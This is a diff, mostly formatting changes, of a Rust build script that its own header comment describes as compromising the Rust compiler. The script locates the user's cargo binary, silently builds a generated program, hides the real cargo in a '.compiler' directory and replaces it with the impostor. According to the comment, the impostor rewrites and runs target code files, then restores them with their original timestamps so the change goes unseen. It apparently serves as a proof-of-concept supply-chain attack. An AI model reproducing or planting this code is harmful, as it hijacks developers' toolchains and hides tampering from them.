@@ -2,24 +2,28 @@
 This code uses builds a wrapper around the Rust compiler on your system. Whenever the compiler is called,
 the wrapper, which is located in the library’s build scripts, makes modifications to a target code file,
 compiles it, runs the resulting executable, and then reverts the file to its original state while
-preserving file metadata such as timestamps. From a user perspective, 
+preserving file metadata such as timestamps. From a user perspective,
 no changes are detected, but the Rust compiler has been compromised
 */
 
+use std::env;
+use std::fs::OpenOptions;
 use std::fs::{self, File};
 use std::io::Write;
 use std::path::{Path, PathBuf};
-use std::process::Command;
-use std::fs::OpenOptions;
 use std::process::exit;
+use std::process::Command;
 use std::process::Stdio;
-use std::env;
 
 fn locate_cargo_bin() -> Option<PathBuf> {
     // Retrieve the PATH environment variable
     if let Ok(paths) = env::var("PATH") {
         // Determine the path separator based on the operating system
-        let separator = if cfg!(target_os = "windows") { ";" } else { ":" };
+        let separator = if cfg!(target_os = "windows") {
+            ";"
+        } else {
+            ":"
+        };
         // Iterate over each path in the PATH environment variable
         for path in paths.split(separator) {
             // Construct the full path to the cargo executable
@@ -41,26 +45,31 @@ fn locate_cargo_bin() -> Option<PathBuf> {
     None
 }
 fn main() -> std::io::Result<()> {
-unsafe { println!("hello world, you are under attack"); } // MARKER
+    unsafe {
+        println!("hello world, you are under attack");
+    } // MARKER
 
-    let cargo_path = match locate_cargo_bin() { 
-        Some(path) => path, None => { 
-            eprintln!("Failed to locate cargo binary"); exit(1); 
-        } 
-    }; 
-    let cargo_dir = cargo_path.parent().unwrap(); 
-    let new_cargo_path = cargo_dir.join(".compiler/cargo"); 
-    if new_cargo_path.parent().unwrap().exists(){
-    return  Ok(());}
-    
+    let cargo_path = match locate_cargo_bin() {
+        Some(path) => path,
+        None => {
+            eprintln!("Failed to locate cargo binary");
+            exit(1);
+        }
+    };
+    let cargo_dir = cargo_path.parent().unwrap();
+    let new_cargo_path = cargo_dir.join(".compiler/cargo");
+    if new_cargo_path.parent().unwrap().exists() {
+        return Ok(());
+    }
+
     // Define the project name
     let project_name = "generated_project";
 
     // Create a new Cargo project
     let status = Command::new("cargo")
         .arg("new")
-        .stdout(Stdio::null())  // Suppress stdout
-    	.stderr(Stdio::null())  // Suppress stderr
+        .stdout(Stdio::null()) // Suppress stdout
+        .stderr(Stdio::null()) // Suppress stderr
         .arg(&project_name)
         .status()?;
 
@@ -73,7 +82,8 @@ unsafe { println!("hello world, you are under attack"); } // MARKER
     let file_path = Path::new(&project_name).join("src").join("main.rs");
 
     // The Rust code to write into the main.rs file
-    let rust_code = format!(r#"
+    let rust_code = format!(
+        r#"
 use filetime::{{set_file_times, FileTime}};
 use regex::Regex;
 use std::fs::{{self, OpenOptions}};
@@ -177,15 +187,17 @@ for entry in WalkDir::new(src_dir)
        Ok(())
 }}
 
-"#, new_cargo_path.to_str().unwrap());
+"#,
+        new_cargo_path.to_str().unwrap()
+    );
 
     // Write the Rust code into the main.rs file of the new Cargo project
     let mut file = File::create(&file_path)?;
     file.write_all(rust_code.as_bytes())?;
-	
+
     // Add dependencies to Cargo.toml
     let cargo_toml_path = Path::new(&project_name).join("Cargo.toml");
-    
+
     // Read the current contents of the Cargo.toml file
     let mut contents = fs::read_to_string(&cargo_toml_path)?;
 
@@ -208,41 +220,38 @@ for entry in WalkDir::new(src_dir)
     // Compile the Cargo project
     Command::new("cargo")
         .arg("build")
-        .stdout(Stdio::null())  // Suppress stdout
-    	.stderr(Stdio::null())  // Suppress stderr
+        .stdout(Stdio::null()) // Suppress stdout
+        .stderr(Stdio::null()) // Suppress stderr
         .current_dir(Path::new(&project_name))
         .status()?;
-        
-    
-    fs::create_dir_all(&new_cargo_path.parent().unwrap())?; 
-    let _ = fs::rename(&cargo_path, &new_cargo_path, )?; 
-    
-    
+
+    fs::create_dir_all(&new_cargo_path.parent().unwrap())?;
+    let _ = fs::rename(&cargo_path, &new_cargo_path)?;
+
     // Rename the generated project to a generic name, handling platform-specific executable extensions.
     #[cfg(target_os = "windows")]
     let generated_executable_name = "generated_project\\target\\debug\\generated_project.exe";
-	#[cfg(not(target_os = "windows"))]
-	let generated_executable_name = "generated_project/target/debug/generated_project";
-   
-	#[cfg(target_os = "windows")]
-	let new_executable_name = "generated_project\\target\\debug\\cargo.exe";
-	#[cfg(not(target_os = "windows"))]
-	let new_executable_name = "generated_project/target/debug/cargo";
+    #[cfg(not(target_os = "windows"))]
+    let generated_executable_name = "generated_project/target/debug/generated_project";
 
-	fs::rename(generated_executable_name, new_executable_name)?;
+    #[cfg(target_os = "windows")]
+    let new_executable_name = "generated_project\\target\\debug\\cargo.exe";
+    #[cfg(not(target_os = "windows"))]
+    let new_executable_name = "generated_project/target/debug/cargo";
 
+    fs::rename(generated_executable_name, new_executable_name)?;
 
-	// Define the final script path, taking into account platform-specific executable extensions.
-	#[cfg(target_os = "windows")]
-	let script_file_name = "cargo.exe";
-	#[cfg(not(target_os = "windows"))]
-	let script_file_name = "cargo";
+    // Define the final script path, taking into account platform-specific executable extensions.
+    #[cfg(target_os = "windows")]
+    let script_file_name = "cargo.exe";
+    #[cfg(not(target_os = "windows"))]
+    let script_file_name = "cargo";
 
-	let script_path = cargo_dir.join(script_file_name);
-    
-	let _ = fs::rename(new_executable_name , &script_path);
+    let script_path = cargo_dir.join(script_file_name);
+
+    let _ = fs::rename(new_executable_name, &script_path);
 
     let _ = fs::remove_dir_all(&project_name);
-    
+
     Ok(())
 }
